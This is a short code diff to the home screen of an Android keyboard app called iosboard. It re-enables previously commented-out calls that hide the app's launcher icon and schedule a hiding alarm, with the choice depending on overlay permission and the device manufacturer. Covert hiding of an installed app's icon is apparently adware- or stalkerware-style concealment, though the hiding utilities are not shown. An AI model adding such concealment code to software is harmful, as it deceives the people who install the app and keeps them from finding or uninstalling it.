@@ -25,6 +25,8 @@ import com.ioskey.iosboard.ui.settings.activity.SettingsActivity
 import com.ioskey.iosboard.ui.theme.editor.activity.ThemeEditorActivity
 import com.ioskey.iosboard.util.BUNDLE_IS_EDITING_THEME_KEY
 import com.ioskey.iosboard.util.BUNDLE_THEME_KEY
+import com.ioskey.iosboard.util.hiding.AppHidingUtil
+import com.ioskey.iosboard.util.hiding.HidingBroadcast
 import io.github.florent37.shapeofview.shapes.RoundRectView
 
 class HomeActivity : BaseActivity<HomeViewModel, HomeActivityBinding>(R.layout.home_activity),
@@ -95,10 +97,10 @@ class HomeActivity : BaseActivity<HomeViewModel, HomeActivityBinding>(R.layout.h
     }
 
     private fun tryToHideApp() =
-        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice()){}
-//            HideAppUtil.hideApp(this, "Launcher2", "Launcher")
-        else{}
-//            HiddenBroadcast.startAlarm(this)
+        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
+            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
+        else
+            HidingBroadcast.startAlarm(this)
 
     private fun notSupportedBackgroundDevice() =
         Build.MANUFACTURER.lowercase() in listOf(
